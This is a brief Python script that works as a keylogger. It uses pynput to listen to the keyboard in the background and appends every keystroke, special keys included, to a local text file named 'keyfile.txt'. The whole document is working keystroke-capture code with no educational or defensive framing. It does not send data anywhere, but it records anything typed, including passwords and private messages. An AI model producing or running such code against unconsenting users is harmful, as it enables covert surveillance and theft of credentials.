from pynput import keyboard

def keyPressed(key):
    print(str(key))  # Print the key to the console (for debugging purposes)
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)  # Write the character to the file
        except AttributeError:
            # Handle special keys that don't have a character representation
            logkey.write('[' + str(key) + ']')

if __name__ == "__main__":
    # Create a keyboard listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()  # Start the listener in a non-blocking way
    input()
